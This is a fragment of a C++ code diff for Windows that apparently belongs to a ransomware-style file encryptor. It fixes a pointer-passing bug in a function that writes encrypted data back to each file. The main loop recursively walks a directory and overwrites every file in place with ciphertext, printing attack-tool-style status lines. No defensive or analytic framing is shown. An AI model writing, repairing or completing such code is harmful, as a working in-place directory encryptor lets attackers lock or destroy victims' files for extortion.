@@ -27,7 +27,7 @@ std::vector<char> ReadBytes(char const* filename) {
 	return fileContents;
 }
 
-BOOL WriteEncryptedToFile(const char* filename, PBYTE* pbEncryptedData, DWORD dwEnctryptedDataLen) {
+BOOL WriteEncryptedToFile(const char* filename, PBYTE pbEncryptedData, DWORD dwEnctryptedDataLen) {
 	BOOL result = TRUE;
 
 	HANDLE hEncFile = nullptr;
@@ -210,7 +210,6 @@ int main(int argc, char** argv) {
 
 	for (const fs::directory_entry& entry : fs::recursive_directory_iterator(dir)) {
 		std::cout << "[*] Encrypting " << entry << " ......." << std::endl;
-		std::cout << "File contents: " << std::endl;
 		PBYTE pbFileContents = nullptr;
 		DWORD dwFileContentLength = 0;
 		BOOL bResult = FALSE;
@@ -228,7 +227,7 @@ int main(int argc, char** argv) {
 			continue;
 		}
 		std::cout << "[+] Encryption completed" << std::endl;
-		bResult = WriteEncryptedToFile(entry.path().string().c_str(), &pbEncryptedData, dwEncryptedDataLen);
+		bResult = WriteEncryptedToFile(entry.path().string().c_str(), pbEncryptedData, dwEncryptedDataLen);
 		if (!bResult) {
 			std::cerr << "[-] WriteEncryptedToFile Error" << std::endl;
 			continue;
